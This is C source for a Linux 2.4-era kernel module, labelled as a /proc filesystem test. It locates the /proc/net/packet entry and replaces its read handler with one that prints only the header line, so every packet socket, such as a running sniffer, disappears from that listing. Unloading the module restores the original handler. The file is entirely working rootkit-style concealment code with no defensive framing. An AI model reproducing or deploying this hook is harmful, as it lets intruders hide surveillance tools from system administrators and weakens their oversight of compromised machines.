/*
 *  proc.c <test on proc filesystem...>
 *
 *  ulix <ulix@gmx.it> [based on palmers' ideas: thnx...]
 */

#ifndef __KERNEL__
#  define __KERNEL__
#endif
#ifndef MODULE
#  define MODULE
#endif

#ifdef DEBUG
#  define dbg(fmt, args...) \
        printk(KERN_DEBUG "proc: %s: " fmt, __FUNCTION__ , ##args)
#else
#  define dbg(fmt, args...)
#endif


#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/config.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/fd.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>

#ifndef module_init
  #define module_init(x)        int init_module(void) { return x(); }
  #define module_exit(x)        void cleanup_module(void) { x(); }
#endif

int (*old_read_proc)(char *, char **, off_t, int, int *, void *);
struct proc_dir_entry *p;

struct proc_dir_entry *fproc (char *name)
{
	static struct proc_dir_entry *pde = NULL;

	if (!name)
		return NULL;

	pde = proc_net->subdir;

	for (; strcmp (name, (char *) pde->name); pde = pde->next) {
		if (pde->subdir != NULL) {
			if (!strcmp (name, (char *) pde->subdir->name)) {
				dbg("strcmp: pde %p...\n", pde);
				return (pde = pde->subdir);
			}
		}
		dbg("pde %p...\n", pde);
	}
	return (pde);
}

static int my_read_proc
(char *buffer, char **start, off_t offset, int length, int *eof, void *data)
{
//	off_t pos = 0;
        off_t begin = 0;
        int len = 0;
//	struct sock *s;

        dbg("actived...\n");

        len += sprintf(buffer,
                "sk       RefCnt Type Proto  Iface R Rmem   User   Inode\n");
/*
        read_lock(&packet_sklist_lock);

        for (s = packet_sklist; s; s = s->next) {
                len+=sprintf(buffer+len,
                             "%p %-6d %-4d %04x   %-5d %1d %-6u %-6u %-6lu",
                             s,
                             atomic_read(&s->refcnt),
                             s->type,
                             ntohs(s->num),
                             s->protinfo.af_packet->ifindex,
                             s->protinfo.af_packet->running,
                             atomic_read(&s->rmem_alloc),
                             sock_i_uid(s),
                             sock_i_ino(s)
                             );
	
                buffer[len++] = '\n';

                pos = begin+len;
                if(pos < offset) {
                        len = 0;
                        begin = pos;
                }
                if(pos > offset + length)
                        goto done;
        }
        *eof = 1;

done:
	read_unlock(&packet_sklist_lock);
        *start = buffer + (offset - begin);
*/	len -= (offset - begin);
        if (len > length)
                len = length;
        if (len < 0)
                len = 0;
        return (len);
}

static int proc_init (void)
{
//	struct proc_dir_entry *p = NULL;
	p = fproc("packet");

	if (p) {
		dbg("low_ino %d  namelen %d  name \"%s\"  mode %d  nlink %d\n",
			p->low_ino, p->namelen, p->name, p->mode, p->nlink);
		dbg("uid %d  gid %d  size %lu\n", p->uid, p->gid, p->size);

		old_read_proc = p->read_proc;
		dbg("p->read_proc %p...\n", p->read_proc);
		dbg("old_read_proc %p...\n", old_read_proc);
		dbg("saved old_read_proc...\n");
		p->read_proc = my_read_proc;
		dbg("setted my_read_proc...\n");
		dbg("p->read_proc %p...\n", p->read_proc);
	}

	dbg("module loaded ....\n");

	return 0;
}


static void proc_exit (void)
{
/*	struct proc_dir_entry *p = NULL;
	p = fproc("packet", NULL);
*/
	if (p) {
		dbg("p->read_proc %p...\n", p->read_proc);
		p->read_proc = old_read_proc;
		dbg("resetted old_read_proc...\n");
	}

	dbg("module unloaded...\n");
}

module_init(proc_init);
module_exit(proc_exit);
